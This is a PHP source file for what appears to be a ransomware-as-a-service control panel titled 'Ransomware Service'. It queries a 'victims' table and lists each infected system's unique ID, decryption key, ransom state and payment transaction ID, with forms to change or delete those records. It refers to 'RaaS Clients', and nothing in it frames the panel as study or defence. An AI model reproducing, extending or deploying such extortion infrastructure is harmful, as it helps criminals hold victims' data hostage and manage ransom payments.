
<?php

require "conf.php";

$sql = "SELECT * FROM victims";
$res = $conn -> query($sql);
$count = mysqli_num_rows($res);

$arr = [];

if($count > 0)
{
	while($row = mysqli_fetch_assoc($res))
	{
		$id = $row['ransomware_ID'];
		$uuid = $row['system_ID'];
		$key = $row['ran_key'];
		$status = $row['ransomize'];
		$identifier = $row['custom_identifier'];
		$trans_id = $row['trans_ID'];
		
?>



<!DOCTYPE html>
<html lang="en">
<head>
  <title> Ransomware Service </title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>

  <style>
  input 
  {
    border-width: 0;
  }
</style>

</head>
<body>

<div class="container" style="margin-top: 50px;">
  <h2>Ransomware Victims</h2>
  <p>This table contains list of victims and their ransomware statuses. </p>            
  <table class="table table-bordered">
    <thead>
      <tr>
        <th>System Unique ID</th>
        <th>Custom Identifier</th>
        <th>Password</th>
        <th>Ransomize (State: 0, 1, -1)</th>
        <th>Transaction ID</th>
        <th>Actions</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <form action="edit.php" method="POST">
               <input type="hidden" name="ransom_id" value="<?php echo $id; ?>"> 
          <td> <?php echo $uuid; ?> </td>     
          <td> <input type="text" name="identifier" value="<?php echo $identifier; ?>"> </input> </td>
          <td> <input type="text" name="key" value="<?php echo $key; ?>"> </input> </td>
          <td> <input type="text" name="status" value="<?php echo $status; ?>"> </input> </td>
          <td> <?php echo $trans_id; ?> </td>
          <td> <input type="submit" name="edit" value="update"> 
               <input type="submit" name="delete" value="delete" formaction="delete.php" onclick="return confirm('Are you sure you want to delete this system?'); "> 
          </td>
        </form>
      </tr>
    </tbody>
  </table>
</div>

</body>
</html>


<?php

	}
}

else
{
	echo "<center> <p> No RaaS Clients Found!!! </p> </center>";
}

$conn -> close();

?>